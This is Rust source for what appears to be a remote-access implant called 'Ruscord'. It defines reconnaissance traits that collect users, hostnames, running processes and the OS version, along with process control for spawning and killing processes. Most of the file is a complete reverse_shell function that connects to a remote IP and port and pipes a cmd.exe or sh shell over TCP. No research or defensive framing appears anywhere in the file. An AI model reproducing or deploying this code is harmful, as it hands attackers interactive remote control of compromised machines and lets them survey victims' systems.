#![allow(dead_code)]

pub mod recon {
	pub trait ReconModule {
		/// Returns the currently logged in user
		fn username(&self) -> String;
		/// Returns the currently logged in hostname
		fn hostname(&self) -> String;
		/// Returns the list of running processes on the host;
		fn processes(&self) -> Option<Vec<Process>>;
		/// Retrieves OS version information
		fn os_version(&self) -> String;
		/// Retrieves the list of users and their groups on the host.
		fn users(&self) -> Vec<User>;
	}

	#[derive(Debug)]
	/// A representation of a running process on the host, with the name of the
	/// process, its PID, and its parent's PID.
	pub struct Process {
		pub name: String,
		pub pid: u32,
		pub ppid: u32,
	}

	#[derive(Debug)]
	pub struct User {
		pub name: String,
		pub uid: u32,
		pub groups: Vec<Group>,
	}

	#[derive(Debug)]
	pub struct Group {
		id: u32,
		name: String,
	}
}

pub mod process {
	use std::{ffi::OsString, future::Future, net::IpAddr, pin::Pin, process::Stdio, sync::Arc};

	use tokio::{
		io::{AsyncReadExt, AsyncWriteExt},
		net::TcpStream,
		process::Command,
		sync::Mutex,
	};
	use tokio_util::bytes::BytesMut;

	use crate::{RuscordError, RuscordResult};

	#[derive(Debug)]
	pub struct EnvironmentVariable {
		pub key: String,
		pub value: String,
	}

	#[derive(Debug)]
	pub struct CurrentProcessInfo {
		pub name: OsString,
		pub pid: u32,
		pub ppid: u32,
		pub env_variables: Vec<EnvironmentVariable>,
	}

	pub trait ProcessModule {
		/// Spawns a new process on the host with the given name and arguments,
		/// returning the PID of the new process.
		fn spawn(&self, name: &str, args: Option<String>) -> RuscordResult<u32>;

		/// Kills the process with the given pid and exit code.
		///
		/// If no exit code is provided, a default exit code of 0 will be used.
		fn kill_other(&self, pid: u32, exit_code: Option<u32>) -> RuscordResult<()>;

		/// Kills the current process.
		///
		/// If no exit code is provided, a default exit code of 0 will be used.
		fn kill_self(&self, exit_code: Option<u32>) -> !;

		/// Spawns a reverse shell
		fn reverse_shell(
			&self, ip: IpAddr, port: u16,
		) -> Pin<Box<dyn Future<Output = Result<(), RuscordError>> + Send + Sync>> {
			Box::pin(async move {
				let stream = TcpStream::connect((ip, port)).await?;
				let (mut owned_read_half, owned_write_half) = stream.into_split();

				let mut command = if cfg!(target_os = "windows") {
					Command::new("cmd.exe")
				} else {
					Command::new("sh")
				}
				.stdin(Stdio::piped())
				.stdout(Stdio::piped())
				.stderr(Stdio::piped())
				.spawn()?;

				let mut stdin = command.stdin.take().unwrap();

				tokio::spawn(async move {
					let mut buf = BytesMut::with_capacity(1024);
					while let Ok(n) = owned_read_half.read_buf(&mut buf).await {
						if n == 0 {
							break;
						}
						if let Err(e) = stdin.write_all(&buf[..n]).await {
							eprintln!("Error writing to stdin: {}", e);
							break;
						}
						if let Err(e) = stdin.write(&[b'\n']).await {
							eprintln!("Error writing newline to stdin: {}", e);
							break;
						}
						if let Err(e) = stdin.flush().await {
							eprintln!("Error flushing stdin: {}", e);
							break;
						}
					}
				});

				let thread_safe_write = Arc::new(Mutex::new(owned_write_half));

				{
					let thread_safe_write = Arc::clone(&thread_safe_write);
					tokio::spawn(async move {
						let mut stdout = command.stdout.take().unwrap();
						let mut buf = BytesMut::with_capacity(1024);
						while let Ok(n) = stdout.read_buf(&mut buf).await {
							if n == 0 {
								break;
							}
							let mut guard = thread_safe_write.lock().await;
							if let Err(e) = guard.write_all(&buf[..n]).await {
								eprintln!("Error writing to stdout: {}", e);
								break;
							}
							if let Err(e) = guard.flush().await {
								eprintln!("Error flushing stdout: {}", e);
								break;
							}
						}
					});
				}

				{
					let thread_safe_write = Arc::clone(&thread_safe_write);
					tokio::spawn(async move {
						let mut stderr = command.stderr.take().unwrap();
						let mut buf = BytesMut::with_capacity(1024);
						while let Ok(n) = stderr.read_buf(&mut buf).await {
							if n == 0 {
								break;
							}
							let mut guard = thread_safe_write.lock().await;
							if let Err(e) = guard.write_all(&buf[..n]).await {
								eprintln!("Error writing to stderr: {}", e);
								break;
							}
							if let Err(e) = guard.flush().await {
								eprintln!("Error flushing stderr: {}", e);
								break;
							}
						}
					});
				}

				Ok(())
			})
		}

		/// Retrieves information about the current process.
		fn process_info(&self) -> RuscordResult<CurrentProcessInfo>;
	}
}
